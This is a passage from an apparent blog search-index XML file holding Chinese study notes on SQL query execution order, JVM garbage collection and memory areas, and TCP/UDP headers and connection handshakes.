expr3)，如果expr1为true，不等于0，且不等于null，则返回expr2，否则返回expr3</li><li>isnull(expr1)，判断expr1是否为null</li></ul></li><li>分组与组函数：avg、count、max、min和sum<ul><li>having子句：不能在where子句中过滤组，where子句仅用于过滤行。过滤组必须使用having子句；不能在where子句中使用组函数，having子句才可以使用组函数</li></ul></li><li>多表连接查询： 查询用的多个数据表显式使用xxx join连接，而不是直接依次排列在from之后，from之后只需要放一个数据表；连接条件不再放在where之后，而是提供了专门的连接条件子句<ul><li>on子句连接，每个on子句只指定一个连接条件</li><li>左、右、全外连接：left join、right join、full join<br />SQL99与SQL92的外连接恰好相反，SQL99左外连接将会把左边表中所有不满足连接条件的记录全部列出；SQL99右外连接将会把所有右边表不满足连接条件的记录全部列出；全外连接将会把两个表中所有不满足条件的记录全部列出（Mysql并不是全外连接）</li></ul></li><li>集合运算：将select返回的两个结果集做运算，intersect（交，不支持，使用多表连查来替代）、union（并）、minus（差，不支持，使用子查询来替代）<br />注意：<ul><li>两个结果集所包含的数据列的数量必须相同</li><li>两个结果集所包含的数据列的数据类型也必须一一对应</li></ul></li></ol><h2 id="sql-select语句的完整执行顺序"><a class="markdownIt-Anchor" href="#sql-select语句的完整执行顺序"></a> SQL select语句的完整执行顺序</h2><ul><li>from子句组装来自不同数据流的数据</li><li>where子句基于指定的条件对记录行进行筛选</li><li>group by子句将数据划分为多个分组</li><li>使用聚集函数进行计算</li><li>使用having子句筛选分组</li><li>计算所有的表达式</li><li>select的字段</li><li>使用order by对结果集进行排序</li></ul><p>SQL语言不同于其他编程语言最明显特征就是处理代码的顺序。在大多数据库语言中，代码按编码顺序被处理。但在SQL语言中，第一个被处理的子句是FROM，而不是SELECT，SQL查询处理的步骤编号如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(8)<span class="keyword">SELECT</span> (<span class="number">9</span>) <span class="keyword">DISTINCT</span> (<span class="number">11</span>) &lt;TOP_specification&gt; &lt;select_list&gt;</span><br><span class="line">(<span class="number">1</span>) <span class="keyword">FROM</span> &lt;left_table&gt;</span><br><span class="line">(<span class="number">3</span>) &lt;join_type&gt; <span class="keyword">JOIN</span> &lt;right_table&gt;</span><br><span class="line">(<span class="number">2</span>) <span class="keyword">ON</span> &lt;join_condition&gt;</span><br><span class="line">(<span class="number">4</span>) <span class="keyword">WHERE</span> &lt;where_condition&gt;</span><br><span class="line">(<span class="number">5</span>) <span class="keyword">GROUP</span> <span class="keyword">BY</span> &lt;group_by_list&gt;</span><br><span class="line">(<span class="number">6</span>) <span class="keyword">WITH</span> &#123;<span class="keyword">CUBE</span> | <span class="keyword">ROLLUP</span>&#125;</span><br><span class="line">(<span class="number">7</span>) <span class="keyword">HAVING</span> &lt;having_condition&gt;</span><br><span class="line">(<span class="number">8</span>) <span class="keyword">ORDER</span> <span class="keyword">BY</span> &lt;order_by_list&gt;</span><br></pre></td></tr></table></figure><p>以上每个步骤都会产生一个虚拟表，该虚拟表被用作下一个步骤的输入。这些虚拟表对调用者（客户端应用程序或者外部查询）不可用。只有最后一步生成的表才会给调用者。如果没有在查询中指定某一个子句，将跳过相应的步骤。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM虚拟机总结</title>
      <link href="/JVM-summary/"/>
      <url>/JVM-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="jvm垃圾处理方法"><a class="markdownIt-Anchor" href="#jvm垃圾处理方法"></a> JVM垃圾处理方法</h2><ul><li><p>标记-清除算法</p><ul><li>标记阶段：先通过根节点，标记所有从根节点开始的对象，未被标记的为垃圾对象</li><li>清除阶段：将所有未标记的对象清除</li></ul></li><li><p>标记-整理算法</p><ul><li>标记阶段：先通过根节点，标记所有从根节点开始的可达对象，未被标记的为垃圾对象</li><li>整理阶段：将所有的存活对象压缩到一段连续的内存空间，之后清理边界的所有空间</li></ul></li><li><p>复制算法</p><ul><li>将所有的内存空间分成两块，每次只使用一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，然后清除正在使用的内存块中的所有对象</li></ul></li></ul><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/JVM%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%89%E7%A7%8D%E7%AE%97%E6%B3%95%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="JVM虚拟机三种算法的比较" /></p><h2 id="gc"><a class="markdownIt-Anchor" href="#gc"></a> GC</h2><ol><li><p>新生代、老年代、持久代</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E6%96%B0%E7%94%9F%E4%BB%A3%E3%80%81%E8%80%81%E5%B9%B4%E4%BB%A3%E3%80%81%E6%8C%81%E4%B9%85%E4%BB%A3.png" alt="" /></p></li><li><p>GC用的可达性分析算法中，可作为GC Roots对象</p><ul><li>Java虚拟机栈中的对象</li><li>方法区中的静态成员</li><li>方法区中的常量引用对象</li><li>本地方法区中的JNI(Native方法)引用对象</li></ul></li><li><p>新生代转移到老年代的触发条件</p><ul><li>长期存活的对象</li><li>大对象直接进入老年代</li><li>Minor GC后，survivor仍然放不下</li><li>动态年龄判断，大于等于某个年龄的对象超过了survivor空间的一半，大于等于这个年龄的对象直接进入老年代</li></ul></li><li><p>MinGC、FullGC</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/MinGC%E3%80%81FullGC.png" alt="" /></p></li><li><p>各个垃圾回收器的工作方式</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Serial%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="Serial收集器" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/ParNew%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="ParNew收集器" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Parallel%20Scavenge%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="Parallel+Scavenge收集器" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/CMS%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="CMS收集器" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/G1%E6%94%B6%E9%9B%86%E5%99%A8.png" alt="G1收集器" /></p><p>还有两个老年代收集器：Serial old和Parallel old收集器</p></li></ol><h2 id="java虚拟机内存的划分以及每个区域的功能"><a class="markdownIt-Anchor" href="#java虚拟机内存的划分以及每个区域的功能"></a> Java虚拟机内存的划分以及每个区域的功能</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Java%E8%BF%90%E8%A1%8C%E6%97%B6%E6%95%B0%E6%8D%AE%E5%8C%BA%E5%9F%9F.png" alt="Java运行时数据区域" /></p><ol><li><p>程序计数器（线程私有）</p><ul><li>线程创建时创建，执行本地方法时其值为undefined</li></ul></li><li><p>虚拟机栈（线程私有）</p><ul><li>（栈内存）为虚拟机执行Java方法服务，方法被调用时创建栈帧–&gt;局部变量表（基本数据类型，对象引用类型）–&gt;局部变量，对象引用</li><li>如果线程请求的栈深度超过了虚拟机所允许的深度，就会出现<code>StackOverfFow</code></li><li>虚拟机栈可以动态扩展，如果扩展到无法申请足够的内存时，会出现<code>OutOfMemeory</code></li></ul></li><li><p>本地方法栈（线程私有）</p><ul><li>Java虚拟机栈是为Java方法服务，而本地方法栈视为虚拟机使用到的Native方法服务</li><li>Java虚拟机没有对本地方法的使用和数据结构做强制规定。Sun HotSpot把Java虚拟机栈和本地方法栈合二为一</li><li>同样抛出<code>StackOverfFlowError</code>和<code>OutOfMemeoryError</code></li></ul></li><li><p>Java堆</p><ul><li>被所有线程所共享，在Java虚拟机启动时创建，几乎所有的对象实例都存放在这里</li><li>GC管理的主要区域</li><li>物理不连续，逻辑上连续，可以动态扩展，扩展失败抛出<code>OutOfMemeoryError</code></li></ul></li><li><p>方法区</p><ul><li>用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码的数据</li><li>Sun HotSpot虚拟机把方法区称为<code>永久代</code></li></ul></li><li><p>运行时常量池</p><ul><li>受到方法区的限制，可能抛出<code>OutOfMemeoryError</code></li></ul></li></ol><h2 id="双亲委派机制"><a class="markdownIt-Anchor" href="#双亲委派机制"></a> 双亲委派机制</h2><p><img src="https://user-gold-cdn.xitu.io/2017/5/8/74d4b5eadd9880c6ede99faefae88d24?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="类加载器双亲委派模型" /></p><p>如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而且把这个请求委派给父类加载器去完成，每一个层次的加载器都如此，因此所有的类加载器都会交给顶层的启动类加载器。只有当父类加载器无法完成该加载请求时（该加载器的搜索范围内没有找到对应的类）时，子加载器才会尝试直接去加载。</p><h2 id="student-s-new-student在内存中做的事情"><a class="markdownIt-Anchor" href="#student-s-new-student在内存中做的事情"></a> Student s = new Student()在内存中做的事情</h2><ol><li>加载Student class文件到内存</li><li>在栈内存为s开辟空间（对象引用类型）</li><li>在堆内存为学生对象开辟空间（对象实例）</li><li>对学生对象的成员变量进行默认初始化</li><li>对学生对象的成员变量进行显式初始化</li><li>通过构造方法给学生对象的成员变量进行赋值</li><li>学生对象初始化完成， 把对象地址赋值给s变量</li></ol><h2 id="java的gc为什么要分代"><a class="markdownIt-Anchor" href="#java的gc为什么要分代"></a> Java的GC为什么要分代</h2><p>分代的垃圾回收策略，是基于这样一个事实：**不同的对象的生命周期是不一样的。**因此，不同生命周期的对象可以采取不同的收集方式，以便提高回收效率。</p><blockquote><p>试想，在不进行对象存活时间区分的情况下，每次垃圾回收都是对整个堆空间进行回收，花费时间相对会长，同时，因为每次回收都需要遍历所有存活对象，但实际上，对于生命周期长的对象而言，这种遍历是没有效果的，因为可能进行了很多次遍历，但是他们依旧存在。因此，分代垃圾回收采用分治的思想，进行代的划分，把不同生命周期的对象放在不同代上，不同代上采用最适合它的垃圾回收方式进行回收。</p></blockquote><h3 id="如何分代"><a class="markdownIt-Anchor" href="#如何分代"></a> 如何分代</h3><p>虚拟机中共分为三代：年轻代、老年代和持久代。其中持久代主要存放的是Java类的类信息，与垃圾收集要收集的Java对象关系不大。年轻代和老年代是对垃圾收集影响比较大的。</p><ol><li><p>年轻代<br />所有新生成的对象首先都是放在年轻代的。年轻代的目标就是尽可能快速的收集掉那些生命周期短的对象。年轻代分为三个区。一个Eden区，两个Survivor区（一般而言）。大部分对象在Eden区中生成。当Eden区满时，还存活的对象将被复制到Survivor区（两个中的一个），当这个Survivor区也满了的时候，从第一个Survivor区复制过来的并且此时还存活的对象，将被复制到另一个Survivor区，当这个Survivor区也满了的时候，从第一个Survivor区复制过来的并且此时还存活的对象，将被复制到“老年区”。需要注意的是，Survivor的两个区是对称的，没先后顺序，所以同一个区中可能存在从Eden复制过来的对象，和从前一个Survivor复制过来的对象，而复制到老年区的只有从第一个Survivor区过去的对象。而且，Survivor区总有一个是空的。同时，根据程序需要，Survivor区是可以配置为多个的（多于两个），这样可以增加对象在年轻代中的存在时间，减少被放到老年代的可能。</p></li><li><p>老年代<br />在年轻代中经历了N次垃圾回收后仍然存活的对象，就会被放到老年代。因此，可以认为老年代中存放的都是一些生命周期较长的对象。</p></li><li><p>持久代<br />用于存放静态文件，如Java类、方法等。持久代对垃圾回收没有显著影响，但是有些应用可能动态生成或者调用一些class，例如hibernate等，在这种时候需要设置一个比较大的持久代空间来存放这些运动过程中新增的类。</p></li></ol><h2 id="minor-gc-full-gc触发条件是什么"><a class="markdownIt-Anchor" href="#minor-gc-full-gc触发条件是什么"></a> Minor GC、Full GC触发条件是什么？</h2><ul><li>从年轻代空间（包括Eden、Survivor区域）回收内存被称为Minor GC</li><li>对老年代GC称为Major GC</li><li>而Full GC是对整个堆来说</li></ul><p>在最近几个版本的JDK里默认包括了对永生代即方法区的回收（JDK8中无永生代了），出现Full GC的时候经常伴随至少一次的Minor GC,但非绝对的。</p><p>Major GC的速度一般会比Minor GC慢10倍以上。下边看看有那种情况触发JVM进行Full GC及应对策略。</p><ol><li><p>Minor GC触发条件：<br />当Eden区满时，触发Minor GC。</p></li><li><p>Full GC触发条件：</p><ul><li><p>System.gc()方法的调用</p><blockquote><p>此方法的调用是建议JVM进行Full GC，虽然只是建议而非一定，但很多情况下它会触发Full GC，从而增加Full GC的频率，也即增加了间歇性停顿的次数。虽然影响系统建议不能使用这个方法，让虚拟机自己去管理它的内存。</p></blockquote></li><li><p>老年代空间不足</p><blockquote><p>老年代空间只有在新生代对象转入及创建大对象、大数组时才会出现不足的现象，当执行Full GC后空间仍然不足，则抛出如下错误：<code>java.lang.OutOfMemoryError: Java heap space</code>，为避免以上两种情况引起的Full GC，调优时应尽量做到让对象在Minor GC阶段被回收、让对象在新生代多存活一段时间及不要创建过大的对象及数组。</p></blockquote></li><li><p>方法区空间不足</p><blockquote><p>JVM规范中运行时数据区域中的方法区，在HotSpot虚拟机中又被习惯称为永生代或者永生区，Permanet Generation中存放的为一些class的信息、常量、静态变量等数据，当系统中要加载的类、反射的类和调用的方法较多时，Permanet Generation可能会被占满，在未配置为采用CMS GC的情况下也会执行Full GC。如果经过Full GC仍然回收不了，那么JVM会抛出如下错误信息：<code>java.lang.OutOfMemoryError: PermGen space</code>。为避免Perm Gen占满造成Full GC现象，可采用的方法为增大Perm Gen空间或转为使用CMS GC。</p></blockquote></li><li><p>通过Minor GC后进入老年代的平均大小大于老年代的可用内存</p><blockquote><p>如果发现统计数据说之前Minor GC的平均晋升大小比目前old gen剩余的空间大，则不会触发Minor GC而是转为触发full GC</p></blockquote></li><li><p>由Eden区、From Space区向To Space区复制时，对象大小大于To Space可用内存，则把该对象转存到老年代，且老年代的可用内存小于该对象大小</p></li></ul></li></ol><h2 id="g1-gc"><a class="markdownIt-Anchor" href="#g1-gc"></a> G1 GC</h2><p>G1 GC是目前为止最为复杂、也是最先进的GC，在CMS算法中，GC管理的内存被划分为新生代、老年代和永久代/元空间。这些空间必须是地址连续的。在G1算法中，采用了另外一种完全不同的方式组织堆内存，堆内存被划分为多个大小相等的内存块（Region），每个Region是逻辑连续的一段内存，Region的大小可以通过<code>-XX:G1HeapRegionSize</code>参数指定，如果没有配置，默认堆内存按照2048份均分，最后得到一个合理的大小。在G1中，还有一个特殊的区域，叫Humongous 区域。</p><p>如果一个对象占用的空间超过了分区容量50%以上，G1收集器就认为这是一个巨型对象。这些巨型对象，默认直接会被分配在老年代，但是如果它是一个短期存在的巨型对象，就会对垃圾回收器造成负面影响。为了解决这个问题，G1划分了一个Humongous 区域，它用来专门存放巨型对象，下面的图片展示了G1的内存结构：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/7853175-8c5cbf9a129c4d54.png" alt="" /></p><h3 id="g1-gc内存结构"><a class="markdownIt-Anchor" href="#g1-gc内存结构"></a> G1 GC内存结构</h3><p>G1 GC的运行可以分为下面几个阶段：</p><ol><li><p>**初始标记：**扫描根集合，标记所有从根节点可直接到达的对象并将它们的字段压入扫描栈。在分代式G1模式中，初始标记阶段借用 Young GC 的暂停，因而没有额外的、单独的暂停阶段。</p></li><li><p>**并发标记：**这个阶段可以并发执行，GC线程不断从扫描栈取出引用，进行递归标记，直到扫描栈清空。</p></li><li><p>**最终标记：**重新标记写入屏障标记的对象，这个阶段也进行弱引用处理。</p></li><li><p>**筛选回收：**统计每个Region被标记位活的对象有多少，如果发现完全没有活对象的Region就会将其整体回收到可分配 Region 列表中。</p></li></ol><p>与其他GC相比，G1 GC有如下特点：</p><ol><li><p>**并行与并发：**G1 GC能充分利用CPU、多核心等硬件优势，使用多个CPU或者CPU核心来缩短STW的时间，部分其他GC需要停顿java线程执行的GC操作，在G1 GC中仍然可以通过并发的方式让java程序继续执行</p></li><li><p>**分代收集：**和其他GC一样，分代的概念在G1 GC中仍然保留</p></li><li><p>**空间整合：**与CMS的标记-清理算法不同，G1 GC从整体来看是通过”标记-整理“算法实现的GC，从局部（两个Region之间）来看是通过”复制“算法来实现的，无论如何，这两种算法在运行期间都不会产生内存碎片，GC 活动之后可以提供规整的内存空间。</p></li><li><p>**可预测的停顿：**这是G1 GC相对于CMS的另一大优势，降低停顿时间是G1 GC和CMS GC共同关注的，但是G1 GC除了追求低停顿时间外，还建立了可预测的停顿时间模型，能让使用这明确指定在一个长度为M的时间片内，消耗在垃圾收集上的事件不得超过N毫秒。</p></li></ol><p>下面的图片展示了多个GC以及他们工作的分代位置，以及如何组合使用：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/7853175-35e974e2a2f37f82.png" alt="" /></p><h3 id="jvm-gc的触发条件"><a class="markdownIt-Anchor" href="#jvm-gc的触发条件"></a> JVM GC的触发条件</h3><ol><li><p>**Young GC：**当Young generation中的Eden区分配满的时候触发。</p></li><li><p><strong>Full GC：</strong></p></li></ol><ul><li>当准备要触发一次young GC时，如果发现统计数据Young GC的平均大小比目前Old Gen剩余的空间大，则不会触发Young GC而是转为触发Full GC。</li><li>如果有Perm Gen的话，要在Perm Gen分配空间但已经没有足够空间时，也要触发一次Full GC</li><li>调用System.gc()默认也是触发Full GC</li></ul><h3 id="jvm性能监控与故障处理工具"><a class="markdownIt-Anchor" href="#jvm性能监控与故障处理工具"></a> JVM性能监控与故障处理工具</h3><ul><li><p>jps：JVM进程状况工具<br />选项：<br />-m 输出JVM进程启动时传递给主类main方法的参数<br />-l 输出主类的全名，如果进程执行的是jar包，输出jar包的路径<br />-v 输出进程启动时的JVM参数</p></li><li><p>jstat：JVM统计信息监控工具<br />该工具具有丰富的JVM统计功能，具体支持的统计可以使用man jstat来输出帮助文档</p></li><li><p>jinfo：java配置信息工具<br />jinfo用于获取当前JVM的配置信息</p></li><li><p>jmap：java内存映射工具<br />jmap用于生成堆的转储快照，下面为一个使用示例，用于将当前的JVM的堆的快照输出到文件中去</p></li><li><p>jhat：等jhat执行完毕后，就可以打开浏览器查看堆的情况的</p></li><li><p>jstack：JVM堆栈追踪工具<br />jstack用于生成当前堆栈的线程快照，这个命令会将所有在堆上的线程都输出，包括线程的运行状态，持有资源的状态等等，对于java应用调优，jstack是非常有用的。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> JVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络总结</title>
      <link href="/network-summary/"/>
      <url>/network-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="tcp报头格式"><a class="markdownIt-Anchor" href="#tcp报头格式"></a> TCP报头格式</h2><p>定义：TCP传输控制协议是一种面向连接的、可靠的、基于字节流的传输层协议。<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20140609125220296.png" alt="图一.TCP报文格式" /></p><p>图一是TCP报文格式，下面是对各参数的解释</p><ul><li>源端口号和目的端口号：TCP报头中的源端口号和目的端口号同IP数据报中的源IP与目的IP唯一确定一条TCP连接</li><li>序号：用来标识TCP发端向TCP收端发送的数据字节流</li><li>确认序号：ACK标志位为1时确认序号才有效（即不为0）；一旦连接建立，该值将始终发送</li><li>首部长度：报文头长度(单位：bit)/32<br />例子：1000（转化为十进制为8，8 * 32/8 = 32，该报文报头长度为32个字节）<br />存在该字段是因为TCP报头中任选字段长度可变<br />报头不包含任何任选字段则长度是20字节；4位所能表示的最大值为1111，转换为十进制是15，15*32/8 = 60，故报头最大长度是60字节</li><li>保留：占6位，保留为今后使用，目前应置为0</li><li>控制位：6位<ul><li>URG：紧急指针有效性标志</li><li>ACK：确认序号有效性标志，一旦一个连接建立起来，该标志位总被置为1，即除了请求建立连接报文（仅设置SYN标志位为1），其他所有报文的该标志位总为1</li><li>PSH（PuSH）：推送标志位，接收方应尽快将报文段提交至应用层，而不再等到整个缓存都填满了后再向上交付</li><li>RST（ReSeT）：重置连接标志位，当RST=1时，表明TCP连接中出现严重差错，必须释放连接，然后再重新建立运输连接</li><li>SYN：同步序号标志</li><li>FIN：传输数据结束标志</li></ul></li><li>窗口大小（2字节）：TCP流量控制通过连接的每一个端声明窗口大小进行控制（接受缓冲区大小）<br />由于2字节能够表示的最大正整数为65535，故窗口最大值为65535</li><li>检验和（2字节）：检验和覆盖整个TCP报文段；强制字段，有发送端计算存储，有接收端进行验证</li><li>紧急指针（2字节）：当URG=1时，紧急指针才有效</li><li>选项（0-40字节）：当没有使用“选项”时，TCP的首部长度是20字节</li></ul><h2 id="tcp的三次握手与四次挥手"><a class="markdownIt-Anchor" href="#tcp的三次握手与四次挥手"></a> TCP的三次握手与四次挥手</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20170104214009596.png" alt="" /></p><ol><li><p>三次握手：<br />**第一次握手：**主机A发送位码为SYN=1，随机产生seq number=10001的数据包到服务器，主机B由SYN=1知道A要求建立联机，此时状态为SYN_SENT；</p><p>**第二次握手：**主机B收到请求后要确认联机信息，向A发送ack number=（主机A的seq+1），SYN=1，ACK=1，随机产生seq number=20001的包，此时状态有LISTEN变为SYN_RECV；</p><p>**第三次握手：**主机A收到后检查ack number是否正确，即第一次发送的seq number + 1，以及位码ack是否为1，若正确，主机A会再次发送ack number = （主机B的seq+1），ACK=1，主机B收到后确认seq值与ack=1则连接建立成功，双方状态established</p><p>完成三次握手，主机A与主机B开始传送数据。</p><p><strong>各个状态名称与含义</strong></p><ul><li>CLOSED：表示初始状态</li><li>LISTEN：表示服务器端的某个socket处于监听状态，可以接受连接了</li><li>SYN_RECV：这个状态表示接受到了SYN报文，在正常情况下，这个状态是服务端的socket在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上用netstat你是很难看到这个状态的。这种状态时，当收到客户端的ACK报文后，它会进入到established</li><li>SYN_SENT：这个状态与SYN_RECV遥相呼应，当客户端socket执行connect连接时，它首先发送SYN报文，因此也随机它会进入到了SYN_SENT状态，并等到服务端的发送三次握手中的第2个报文。SYN_SENT状态表示客户端已发送SYN报文</li><li>ESTABLISHED：表示连接已经建立了。</li></ul></li><li><p>四次挥手：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/1641067-5ed8bf6c24244b4c.png" alt="" /></p><p>假设Client端发起中断请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说“我client端要发给你了”，但是如果你还没有数据要发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，“告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，“告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，“就知道可以关闭连接了，但是它还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。”，Server端收到ACK后，“就知道可以断开连接了”。Client端等待2MSL（报文最大生存时间）后仍然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。这样，TCP连接就这样关闭了。</p><p><strong>各个状态名称与含义：</strong></p><ul><li>FIN_WAIT_1：其实FIN_WAIT_1与FIN_WAIT_2状态的真正含义都是表示等待对方的FIN报文。这两种状态的区别是：FIN_WAIT_1状态实际上是当Socket在established状态时，它想主动关闭连接，向对方发送FIN报文，此时该socket即进入FIN_WAIT_1状态。而当对方回应ACK报文后，则进入FIN_WAIT_2状态。当然在实际的正常情况下，无论对方何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1状态比较难见，而FIN_WAIT_2状态可以用netstat看到。</li><li>FIN_WAIT_2：实际上该状态下的socket，表示半连接，也即有一方要求close连接，但另外还告诉对方，我暂时还有些数据要传，稍后再关闭连接。</li><li>TIME_WAIT：表示收到了对方的FIN报文，并发送出了ACK报文，就等2MSL后即可回到CLOSED可用状态了。如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文时，则可直接进入TIME_WAIT状态，而无需经过FIN_WAIT_2状态。</li></ul></li></ol><p><strong>下面两个问题记牢</strong></p><p><strong>为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？</strong><br />*第一种回答：*这是因为服务端的listen状态下的socket当收到SYN报文的连接请求时后，它可以把ACK和SYN（ACK起到应答作用，而SYN起同步作用）放在一个报文里来发送。但关闭连接时，当收到对方的FIN报文通知时，它仅仅表示对方没有数据发送给你了，但未必你所有的数据都全部发送给对方了，所以你可以未必会关闭socket连接，也即你可能还需要发送一些数据给对方之后，在发送FIN报文给对方来表示你同意现在可以关闭连接了，所以它这里的ACK报文和FIN报文多数情况下都是分开发送的。</p><p>*第二种回答：*因为当Server端收到Client端的SYN连接请求后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭Socket，所以只能先回复一个ACK报文，告诉client端，“你发送的FIN报文我收到了”。只有等到Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送，故需要四次挥手。</p><p><strong>为什么TIME_WAIT状态还需要等待2MSL后才能返回到CLOSED状态？</strong><br />答：因为虽然双方都同意关闭连接了，而且握手的4个报文也都发送完毕，按理可以直接回到CLOSED状态（就好比从SYN_SENT状态到ESTABLISH状态那样），但是我们必须假想网络是不可靠的，有可能最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。</p><h2 id="udp报头格式"><a class="markdownIt-Anchor" href="#udp报头格式"></a> UDP报头格式</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20150819162030063.png" alt="" /></p><p>源端口号：在需要对方回信时选用。不需要是可全为0<br />目的端口号：这在终点交付报文时必须要使用到<br />UDP长度：UDP报文的字节长度（包括首部和数据）<br />UDP校验和：检验UDP首部和数据部分的正确性</p><h2 id="tcpudp区别"><a class="markdownIt-Anchor" href="#tcpudp区别"></a> TCP/UDP区别</h2><p><em>课本：</em><br />UDP在传输数据之前<strong>不需要先建立连接</strong>。远程主机的运输层在收到UDP报文后，不需要给出任何确认。虽然UDP不提供可靠交付，但在某些情况下UDP却是一种最有效的工作方式。</p><p>TCP则<strong>提供面向连接的服务</strong>。在传送数据之前必须先建立连接，数据传送结束后要释放连接。TCP不提供广播或多播服务。由于TCP要提供可靠地、面向连接的运输服务，因此不可避免地增加了许多的开销，如确认、流量控制、计时器以及连接管理等。这不仅使协议数据单元的首部增大很大，还要占用许多的处理机资源。</p><p><em>博客答案：</em></p><table><thead><tr><th></th><th>TCP</th><th>UDP</th></tr></thead><tbody><tr><td>是否连接</td><td>面向连接</td><td>面向非连接</td></tr><tr><td>传输可靠性</td><td>可靠的</td><td>不可靠的</td></tr><tr><td>应用场合</td><td>传输大量的数据</td><td>少量数据</td></tr><tr><td>速度</td><td>慢</td><td>块</td></tr></tbody></table><p>OSI和TCP/IP模型在传输层定义两种传输协议：TCP（传输控制协议）和UDP（用户数据报协议）。</p><p><strong>UDP</strong><br />UDP和TCP的主要区别在于UDP不一定提供可靠的数据传输。事实上，该协议不能保证数据准确无误地到达目的地。UDP在很多方面非常有效。当某个程序的目标是尽快地传输尽可能多的信息时（其中任意给定的重要性相对较低），可使用UDP。许多程序将使用单独的TCP连接和单独的UDP连接。重要的状态信息随可靠的TCP连接发送，而主数据留通过UDP发送。</p><p><strong>TCP</strong><br />TCP的目的是提供可靠的数据传输，并在相互进行通信的设备或服务之间保持一个虚拟连接。TCP在数据包接收无序、丢失或在交付期间被破坏时，负责数据恢复。它通过为其发送的每个数据包提供一个序号来完成此恢复。较低的网络层会将每个数据包视为一个独立的单元，因此，数据包可以沿完全不同的路径发送，即使它们都是同一消息的组成部分。这种路由与网络层处理分段和重新组装数据包的方式非常相似，只是级别更高而已。<br />为确保正确地接收数据，TCP要求在目标计算机成功收到数据时发回一个确认（即ACK）。如果在某个时限内未收到相应的ACK，将重新传送数据包。如果网络阻塞，这种重新传送将导致发送的数据包重复。但是，接收计算机可使用数据包的序号来确认它是否为重复数据包，并在必要时丢弃它。</p><p><strong>TCP与UDP的选择：</strong><br 